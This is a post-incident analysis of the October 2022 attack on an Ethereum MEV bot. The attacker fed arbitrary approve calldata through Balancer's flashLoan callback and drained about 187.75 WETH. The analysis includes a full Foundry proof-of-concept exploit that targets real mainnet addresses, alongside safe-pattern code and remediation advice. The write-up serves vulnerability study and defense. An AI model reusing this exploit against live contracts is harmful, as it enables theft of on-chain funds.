# MEV Bot (0xa47b) — Balancer flashLoan Arbitrary Call Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | MEV Bot (0x00000000000A47b) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~187.75 WETH |
| **MEV Bot** | [0x00000000000A47b1298f18Cf67de547bbE0D723F](https://etherscan.io/address/0x00000000000A47b1298f18Cf67de547bbE0D723F) |
| **Attack Contract** | [0x4b77c789fa35B54dAcB5F6Bb2dAAa01554299d6C](https://etherscan.io/address/0x4b77c789fa35B54dAcB5F6Bb2dAAa01554299d6C) |
| **Attacker** | [0x1dc90b5b7FE74715C2056e5158641c0af7d28865](https://etherscan.io/address/0x1dc90b5b7FE74715C2056e5158641c0af7d28865) |
| **Balancer Vault** | [0xBA12222222228d8Ba445958a75a0704d566BF2C8](https://etherscan.io/address/0xBA12222222228d8Ba445958a75a0704d566BF2C8) |
| **SushiSwap WETH/USDC** | [0x397FF1542f962076d0BFE58eA045FfA2d347ACa0](https://etherscan.io/address/0x397FF1542f962076d0BFE58eA045FfA2d347ACa0) |
| **Uniswap V3 Router** | [0xE592427A0AEce92De3Edee1F18E0157C05861564](https://etherscan.io/address/0xE592427A0AEce92De3Edee1F18E0157C05861564) |
| **WETH** | [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2](https://etherscan.io/address/0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) |
| **USDC** | [0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| **Root Cause** | Arbitrary calldata delivered to MEV Bot via Balancer `flashLoan()` callback; MEV Bot did not validate the caller, allowing WETH approval and theft |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/MEVa47b_exp.sol) |

---
## 1. Vulnerability Overview

MEV Bot `0x00000000000A47b` is an arbitrage bot on the Ethereum mainnet that held WETH and USDC. Balancer's `flashLoan()` function invokes a `receiveFlashLoan()` callback on the borrower, but the `userData` parameter of this callback can carry arbitrary calldata. The attacker used Balancer to deliver `approve(attacker, max)` calldata to the MEV Bot, which trusted the Balancer address and executed it as-is. The attacker then drained 187.75 WETH from the MEV Bot via `transferFrom()`. This attack follows the same pattern as the `0xbaDc0dE` MEV Bot attack from September 2022.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable MEV Bot - No validation of Balancer flashLoan callback
contract MEVBotA47b {
    // Balancer flashLoan() callback
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData  // ❌ Attacker-controlled calldata
    ) external {
        // ❌ Does not verify that msg.sender is the actual Balancer Vault
        // ❌ Passes userData directly to WETH via call() → approve(attacker, max)

        (address target, bytes memory data) = abi.decode(userData, (address, bytes));
        (bool success,) = target.call(data); // ❌ Executes arbitrary calldata
        require(success);
    }
}

// ✅ Correct pattern
contract SafeMEVBot {
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    bool private _inFlashLoan;

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        // ✅ Verify that the caller is the actual Balancer Vault
        require(msg.sender == BALANCER_VAULT, "Not Balancer");
        // ✅ Verify that the flash loan was initiated by this contract
        require(_inFlashLoan, "Not initiated by this contract");
        // ✅ Strictly restrict which functions can be executed via userData
        _executeArbitrage(userData);
    }

    function initiateFlashLoan(/* ... */) external onlyOwner {
        _inFlashLoan = true;
        balancer.flashLoan(/* ... */);
        _inFlashLoan = false;
    }
}
```

---
### On-Chain Original Code

Source: Bytecode decompilation


**MEVa47b_decompiled.sol** — Entry point:
```solidity
// ❌ Root cause: Arbitrary calldata delivered to MEV Bot via Balancer `flashLoan()` callback; MEV Bot did not validate the caller, allowing WETH approval and theft
    function cpo() external {}  // 0xf3a50f89
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Construct userData:
    │       target = WETH contract address
    │       data   = abi.encodeWithSelector(
    │                   WETH.approve.selector,
    │                   attacker,
    │                   type(uint256).max
    │               )
    │
    ├─[2] Call Balancer.flashLoan(
    │         receiver = MEVBot,
    │         tokens   = [WETH],
    │         amounts  = [1 ether],
    │         userData = above calldata
    │       )
    │       └─ Balancer executes MEVBot.receiveFlashLoan()
    │           └─ MEVBot passes userData to WETH.call() → approve(attacker, max)
    │               ❌ No validation of msg.sender (Balancer)
    │
    ├─[3] WETH.transferFrom(MEVBot, attacker, 187.75 WETH)
    │
    ├─[4] Profit realized via USDC → WETH swap (Uniswap V3)
    │
    └─[5] Net profit: 187.75 WETH (~$250,000)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract MEVa47bExploit is Test {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 WETH  = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address mevBot = 0x00000000000A47b1298f18Cf67de547bbE0D723F;

    function setUp() public {
        vm.createSelectFork("mainnet", 15_741_332);
    }

    function testExploit() public {
        address attacker = address(this);
        emit log_named_decimal_uint("[Start] MEV Bot WETH", WETH.balanceOf(mevBot), 18);

        // [Step 1] Encode approve calldata into userData
        bytes memory approveData = abi.encodeWithSelector(
            IERC20.approve.selector,
            attacker,
            type(uint256).max
        );
        bytes memory userData = abi.encode(address(WETH), approveData);

        // [Step 2] Deliver calldata to MEV Bot via Balancer flashLoan
        // Actually borrows 1 WETH (repaid immediately)
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1 ether;

        // ⚡ approve executes inside MEV Bot's receiveFlashLoan()
        balancer.flashLoan(mevBot, tokens, amounts, userData);

        // [Step 3] Drain all WETH from MEV Bot
        uint256 botBalance = WETH.balanceOf(mevBot);
        WETH.transferFrom(mevBot, attacker, botBalance);

        emit log_named_decimal_uint("[End] Attacker WETH", WETH.balanceOf(attacker), 18);
        emit log_named_decimal_uint("[End] MEV Bot WETH", WETH.balanceOf(mevBot), 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary calldata execution via Balancer flashLoan callback |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | External protocol callback abuse |
| **Attack Vector** | `flashLoan(mevBot, ..., userData=approve_calldata)` |
| **Precondition** | MEV Bot executes `userData` from Balancer callback without validation |
| **Impact** | ~187.75 WETH lost |

---
## 6. Remediation Recommendations

1. **Validate callback caller**: Always verify `msg.sender == BALANCER_VAULT` inside `receiveFlashLoan()`.
2. **Confirm self-initiation**: Use a state variable or nonce to ensure the callback is only processed when the flash loan was initiated by the contract itself.
3. **Whitelist userData**: Strictly restrict which functions and target contracts can be executed via `userData`.

---
## 7. Lessons Learned

- **Recurring MEV bot vulnerability**: The `0xbaDc0dE` attack in September 2022 (via dYdX) and the `0xa47b` attack in October 2022 (via Balancer) share the same pattern. MEV bot vulnerabilities that execute arbitrary calldata have been repeatedly exploited across multiple flash loan protocols.
- **Diversity of flash loan protocols**: dYdX, Balancer, AAVE, and others each have different flash loan callback mechanisms, but all allow arbitrary data to be passed via `userData` or `data` fields. MEV bot developers must apply the same defensive code uniformly across all supported protocols.